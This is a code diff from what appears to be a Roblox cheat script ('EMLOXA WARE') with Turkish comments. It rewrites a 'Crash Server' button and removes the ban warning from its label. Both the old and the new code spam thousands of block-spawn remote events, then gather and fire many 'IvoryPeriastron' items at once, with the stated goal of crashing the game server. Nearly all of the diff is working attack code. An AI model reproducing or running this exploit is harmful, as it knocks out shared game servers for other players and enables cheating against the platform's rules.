@@ -239,68 +239,50 @@ function GameModule:Init(Window)
     local CrashRunning = false
     local CrashConnection = nil
 
-    CrashTab:CreateButton("Crash Server (MAY CAUSE BAN)", function()
+    CrashTab:CreateButton("Crash Server", function()
         if CrashRunning then return end
         CrashRunning = true
         print("[EMLOXA WARE] Starting crash sequence...")
 
         task.spawn(function()
             -- 1. Aşırı yük: 2000 adet blok spawn isteği gönder
-            local allBlockNames = {"SpawnLuckyBlock", "SpawnSuperBlock", "SpawnDiamondBlock", "SpawnRainbowBlock", "SpawnGalaxyBlock"}
-            for i = 1, 2000 do
-                for _, blockName in ipairs(allBlockNames) do
-                    local remote = ReplicatedStorage:FindFirstChild(blockName)
-                    if remote then remote:FireServer() end
-                end
-                -- Her 50 istekte bir yield ver, yoksa oyun donar
-                if i % 50 == 0 then task.wait() end
-            end
+           local lplr = game.Players.LocalPlayer
 
-            -- 2. IvoryPeriastron toplama (eğer varsa)
-            local da = #LocalPlayer.Character:GetChildren()
-            local target = 30
-            local collected = 0
-            local timeout = 0
+-- Başlangıç değerleri
+local da = #lplr.Character:GetChildren()
+local skok = 0
+local daskok = 30
 
-            while CrashRunning and collected < target do
-                for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
-                    if item.Name == "IvoryPeriastron" then
-                        item.Parent = LocalPlayer.Character
-                        collected = collected + 1
-                        print("[EMLOXA WARE] IvoryPeriastron collected: " .. collected .. "/" .. target)
-                    end
-                end
-                -- Her 10 döngüde bir blok spawn etmeye devam et (sunucuyu meşgul tut)
-                if collected < target then
-                    for _, blockName in ipairs(allBlockNames) do
-                        local remote = ReplicatedStorage:FindFirstChild(blockName)
-                        if remote then remote:FireServer() end
-                    end
-                end
-                timeout = timeout + 1
-                if timeout > 500 then break end -- 15 saniye timeout
-                task.wait()
-            end
+-- 1. Sunucuya çok sayıda blok spawn isteği gönder (sunucuyu yavaşlatmak için)
+for i = 1, 1000 do
+    game.ReplicatedStorage.SpawnRainbowBlock:FireServer()
+    game.ReplicatedStorage.SpawnDiamondBlock:FireServer()
+    game.ReplicatedStorage.SpawnSuperBlock:FireServer()
+    game.ReplicatedStorage.SpawnLuckyBlock:FireServer()
+    game.ReplicatedStorage.SpawnGalaxyBlock:FireServer()
+end
 
-            if collected >= target then
-                print("[EMLOXA WARE] " .. target .. " IvoryPeriastron collected. Firing all now...")
-                task.wait(1)
-                for _, v in pairs(LocalPlayer.Character:GetChildren()) do
-                    if v.Name == "IvoryPeriastron" and v:FindFirstChild("Remote") then
-                        v.Remote:FireServer(Enum.KeyCode.Q)
-                    end
-                end
-            else
-                print("[EMLOXA WARE] Not enough IvoryPeriastron collected, trying alternative crash...")
-                -- Alternatif: sürekli blok spawn et ve aynı anda tüm remote'leri spamla
-                for i = 1, 100 do
-                    for _, blockName in ipairs(allBlockNames) do
-                        local remote = ReplicatedStorage:FindFirstChild(blockName)
-                        if remote then remote:FireServer() end
-                    end
-                    task.wait()
-                end
-            end
+-- 2. Hedef sayıda IvoryPeriastron toplanana kadar bekle
+while wait(0.1) and #lplr.Character:GetChildren() - da < daskok do
+    for i, v in pairs(lplr.Backpack:GetChildren()) do
+        if v.Name == 'IvoryPeriastron' then
+            v.Parent = lplr.Character
+            skok = #lplr.Character:GetChildren() - da
+            print('Yükleniyor ('..skok..'/'..daskok..')')
+        end
+    end
+end
+
+-- 3. Kısa bekleme
+wait(1)
+print('Done! bye bye server')
+
+-- 4. Tüm IvoryPeriastron'ları aynı anda patlat
+for i, v in pairs(lplr.Character:GetChildren()) do
+    if v.Name == 'IvoryPeriastron' then
+        v.Remote:FireServer(Enum.KeyCode.Q)
+    end
+end
 
             CrashRunning = false
             print("[EMLOXA WARE] Crash sequence finished.")
